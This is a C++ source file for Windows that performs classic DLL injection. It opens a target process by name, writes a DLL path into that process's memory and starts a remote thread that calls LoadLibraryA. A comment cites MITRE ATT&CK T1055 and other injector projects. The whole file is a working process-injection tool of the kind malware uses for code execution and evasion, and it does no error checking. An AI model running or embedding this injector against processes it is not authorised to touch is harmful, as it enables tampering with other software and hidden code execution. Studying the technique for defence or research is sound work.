#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
using namespace std;

/*
** Classic Dll Injection Via Createremotethread And Loadlibrary
** Reference:
** [1] - https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process
** [2] - https://github.com/Zer0Mem0ry/StandardInjection
** [3] - https://github.com/saeedirha/DLL-Injector
** [4] - https://attack.mitre.org/wiki/Technique/T1055
*/

// Get The Process ID
DWORD GetProcessID(const char* procname)
{
	PROCESSENTRY32 pe;
	HANDLE hSnap;

	pe.dwSize = sizeof(PROCESSENTRY32);
	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (Process32First(hSnap, &pe)) {
		do
		{
			if (strcmp(pe.szExeFile, procname) == 0)
				break;
		} while (Process32Next(hSnap, &pe));
	}
	return pe.th32ProcessID;
}

int main(int argc, char const *argv[])
{
	char strTmp[256], ProcessName[256], dllPathTmp[512];
	// Process running Input
	cout << "Example: crackme, basecalc,..." << endl;
	cout << "Enter Process Name: "; rewind(stdin);
	cin.getline(strTmp, sizeof(strTmp));
	strcpy(ProcessName, strcat(strTmp, ".exe"));

	// DLL Path Input
	cout << "Enter DLL Path: ";
	cin.getline(dllPathTmp, sizeof(dllPathTmp));

	// Starting Injection
	cout << "[ Starting ] Classic Dll Injection Via Createremotethread And Loadlibrary" << endl;

	// DLL Path
	LPCSTR DllPath = dllPathTmp;

	// Open Target Proccess
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetProcessID(ProcessName));

	// Allocate DllPath inside Target Proccess
	LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(DllPath) + 1, MEM_COMMIT, PAGE_READWRITE);

	// Write DllPath into the memory address space allocated
	WriteProcessMemory(hProcess, pDllPath, (LPVOID)DllPath, strlen(DllPath) + 1, 0);

	// Create RemoteThread and call DLL
	HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
		(LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"),
			"LoadLibraryA"), pDllPath, 0, 0);

	// Loading
	WaitForSingleObject(hLoadThread, INFINITE);

	// Allocated at
	cout << "[ OK ] Dll path allocated at: " << hex << pDllPath << endl;

	// Giải phóng vùng nhớ cấp cho DllPath
	VirtualFreeEx(hProcess, pDllPath, strlen(DllPath) + 1, MEM_RELEASE);

	cout << "[ OK ] Classic Dll Injection is Successful!!" << endl;
	cout << "[ EXIT ] Press any key to exit." << endl;

	getchar();
	return 0;
}